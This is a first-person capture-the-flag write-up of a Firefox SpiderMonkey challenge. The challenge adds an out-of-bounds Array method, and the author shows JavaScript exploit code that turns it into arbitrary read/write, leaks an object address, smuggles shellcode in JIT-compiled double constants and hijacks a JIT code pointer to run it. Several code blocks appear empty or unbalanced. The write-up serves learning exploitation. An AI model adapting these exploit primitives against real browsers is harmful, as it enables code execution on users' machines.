12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning opportunity for me. Because I started the challenge when not much time was left, this write-up may not fully and correctly convey all technical details. Please keep that in mind and hit me up if you find anything incorrect, I would be happy to learn and update my post!

## Challenge Overview

This is a javascript engine pwn challenge and our target is Firefox's Spidermonkey. We are not provided with the built binaries but with patch file, build config file and commit log. Firefox does not use the regular git VCS like Chrome or V8 so it was a bit more difficult in the beginning for v8 people like me.

## Building Spidermonkey

The official build instruction [^1] is pretty good already. Building a specific revision and building the debug version is a bit more work.

```bash
sudo apt-get install python3 python3-dev
python3 -m pip install --user mercurial
curl https://hg.mozilla.org/mozilla-central/raw-file/default/python/mozboot/bin/bootstrap.py -O
python3 bootstrap.py

cd mozilla-unified

# Or you can just clone the beta repo where the challenge commit is
# hg clone https://hg.mozilla.org/releases/mozilla-beta/ mozilla-unified

# Checkout the correct revision
hg update -r f4922b9e9a6b
```

To build with the provided config, we just need to copy `mozconfig` over to `mozilla-unified`. In my case, I need to build a debug version so here is my config file

```
# Build only the SpiderMonkey JS test shell
ac_add_options --enable-application=js
ac_add_options --enable-debug
ac_add_options --disable-optimize
ac_add_options --disable-tests
mk_add_options MOZ_OBJDIR=@TOPSRCDIR@/obj-debug-@CONFIG_GUESS@
```

After that, we just do `./mach build` and wait. If you run into errors saying no `nspr >= 4.32` or something like that, you will need to install `nspr-4.32` from source. The result binary will be in `obj-debug-x86_64-pc-linux-gnu/dist/bin`. To start debugging, just run the `js` binary in gdb like we do with d8.

The debug version provide the useful `dumpObject` method, which we can use to get the address and basic layout of objects. To get passed some checks when doing OOB on the debug version, I also introduced some small patches.

```

## Patch Analysis

Looking at the patch, it is quite obvious that this is an OOB r/w bug in Array. The patch introduce the `oob` method to Array objects

- `oob(idx)` will get the element at index `idx`
- `oob(idx, val)` will set the element at index `idx` to `val`

```diff
+bool js::array_oob(JSContext* cx, unsigned argc, Value* vp) {
+  CallArgs args = CallArgsFromVp(argc, vp);
+  RootedObject obj(cx, ToObject(cx, args.thisv()));
+  double index;
+  if (args.length() == 1) {
+    if (!ToInteger(cx, args[0], &index)) {
+      return false;
+    }
+    GetTotallySafeArrayElement(cx, obj, index, args.rval());
+  } else if (args.length() == 2) {
+    if (!ToInteger(cx, args[0], &index)) {
+      return false;
+    }
+    NativeObject* nobj =
+        obj->is<NativeObject>() ? &obj->as<NativeObject>() : nullptr;
+    if (nobj) {
+      nobj->setDenseElement(index, args[1]);
+    } else {
+      puts("Not dense");
+    }
+    GetTotallySafeArrayElement(cx, obj, index, args.rval());
+  } else {
+    return false;
+  }
+  return true;
+}
```

## Exploit Strategy

OOB r/w is already given to us, but how do we eventually get code execution? There are several things that we need to study:

1. **What does the OOB r/w give us?** In particular:
    1. **What useful information can we read past the Array boundaries?** In this case, we can look for heap pointers and code pointers, especially something like ArrayBuffer's data pointer because that will give more powerful r/w pritimitives.
    2. **Where and what will we write OOB, and to achieve what purpose?** To get arbitrary read/write, we can overwrite the data pointer of ArrayBuffer or Array, but we need to locate its OOB offset as well.
2. **How do we get addrof and/or fakeobj?**
    1. In v8, we can confuse an Array of double and put an object in the confused Array to get its address. Can this be applicable to SM too?
    2. We can use arbitrary read to read from wherever the address of our object is stored.
3. How do we get code execution? And how is it different from v8?
    1. Is JIT/WASM rwx page present? (Spoiler alert! It's gone for a while)
    2. Can we hijack control flow by overwriting code address of native functions?

Most of these questions will be answered throughout the write-up.

## Initial OOB

Let's inspect the layout of an Array in memory to see what's interesting. The `dumpObject` function can be used to get the address and layout of object. We can see right away that there is a pointer to the element array at offset `0x10`. So if we can corrupt this, we may be able to achieve arbitrary r/w.

```

Another interesting object is ArrayBuffer and TypedArray. This is an Uint8Array of length 8 with its data pointer at offst `0x30`. Fortunately, we can see that our OOB Array and this TypedArray is really close to each other, which is a perfect layout to corrupt this TypedArray data pointer to get arbitrary r/w.

```

## Arbitrary Read/Write

With the information we get from the initial OOB r/w, we have 2 ways to get arbitrary r/w now:

1. Corrupt the data pointer of an Array after out OOB Array. I tried this initially and ran into some complications with how SM interprets the data. Basically, it is not easy to just point this data pointer to anywhere and read it as a double value (probably due to how SM values are represented, double values and pointers are differentiated, and the array will still interpret the pointer as an object, not a double value.) It was hard to get addrof primitive this way later on, so I switched to the 2nd method below.
2. Corrupt the data pointer of a TypedArray after out OOB Array. This is the more hassle-free way to read and write data, although we have a relatively small buffer, but 8 bytes is enough, and it is all raw bytes.

We have the following arb r/w primitives:

```js
arb_offset = 13;
x = new Array(1.1, 1.2, 1.3, 1.4);
victim_ta = new Uint8Array(8);

function arb_read(addr) {
    x.oob(arb_offset, addr.toDouble())
    // Not sure why I need this, maybe not.
    x.oob(arb_offset - 3, (0xfffa000000000000n).toDouble())
    read_ta = new BigUint64Array(victim_ta.buffer);
    return read_ta[0];
}

function arb_write(addr, val) {
    x.oob(arb_offset, addr.toDouble())
    for (var i = 0; i < 8; i++) {
        victim_ta[i] = Number((val >> BigInt(i * 8) & 0xffn))
    }
}
```

## (Weak) Addrof

Reading several resources [^2] [^3], I figured out that setting a property of an object to a target object will allow us to leak the address of that target object. In this case, I was trying to leak address of the JIT-ed function. We can see a pointer to this victim_obj in the memory of `victim_ta` now.

```js
victim_obj = sc;
victim_ta.what = victim_obj;
```

```

We see that there is a pointer to the object at offset `0x8`. The object address is represented differently with the `0xfffe` tag, but we can certainly leak this address using the OOB and arbitrary read/write.

```js
leak_offset = 8
// Leak the pointer containing `what` property object address
leak = x.oob(leak_offset)

// Read the object address
x.oob(arb_offset, leak)
read_ta = new BigUint64Array(victim_ta.buffer);
jitfunc_addr = read_ta[0] & 0xffff_ffffffffn;
```

It is worth noting that I could only leak the address of object once, and leaking any object again may require building another array and victim layout. For my exploit, this is enough.

## Code Execution

This is probably the most interesting part. In v8, we are basically done if we can figure out the address of a rwx WASM page, but in SM, it is not so easy. There is no rwx WASM or JIT page.

The resources suggest that there is a way that way can smuggle executable code into JIT-ed functions, and point the JIT-ed code to the desired code address. We do this by JIT-ing a function with just constant values where they are actually shellcode. Because the code is marked executable, these bytes will be read-executable. The only disadvantage is that we need to hardcode all of these values, so no dynamic shellcode at this stage (e.g. we cannot write shellcode based on some info leak before that). But this is already good enough.

There are 2 tasks left:

1. Search the memory for the address of our smuggled shellcode.
2. Figure out the code pointer of a victim JIT-ed function and overwrite this pointer.

In the shellcode function, we put a marker value so we can search for it in memory by scanning:

```js
function sc() {
    sc_marker = 5.40900888e-315;      // 0x41414141 in memory - Used as a way to find
    SC1 = 6.828527034422786e-229;
    SC2 = 7.340387646374746e+223
    SC3 = -5.6323145813786076e+190
    SC4 = 7.748604185565308e-304
    SC5 = 7.591064455398236e+175
    SC6 = 1.773290436458278e-288
    SC7 = 7.748604204935092e-304
    SC8 = 2.1152000545026834e+156
    SC9 = 2.7173154612872197e-71
    SC10 = 1.2811179539027648e+145
    SC11 = 4.0947747766066967e+40
    SC12 = 1.7766685363804036e-302
    SC13 = 3.6509617888350745e+206
    SC14 = -6.828523606646638e-229  
}

for(i = 0; i < 0x1000; i++) {
    sc();
}

rce_offset = jitfunc_addr + 0x28n;
jit_addr = arb_read(rce_offset);
code_addr = arb_read(jit_addr);

sc_start = -1
for (var i = 0; i < 1000; i++) {
    sc_start = code_addr + BigInt(8 * i);
    check = arb_read(sc_start)
    if (check == 0x41414141n) {
        break;
    }
}

// The start of the real shellcode
sc_start += 0x8n;
```

```

The only thing left is to overwrite the code pointer of a JIT-ed function and call it. I just choose the `sc` function itself for simplicity

```js
arb_write(jit_addr, sc_start);

// Trigger real shellcode
sc();
```

```zsh

## Conclusion

This is definitely an awesome learning opportunity for me, stepping out of the v8 comfort zone to learn something new. Because the time was tight, I did not focus on fully understand the details so some are missing, like how objects and values are represented. You can check out the resource reading for more in-depth information. I will definitely learn more thoroughly about Spidermonkey after doing this challenge.

Full solution can be found [here](https://github.com/ducphanduyagentp/browser-pwn-advent-calendar/tree/main/06) [^4]
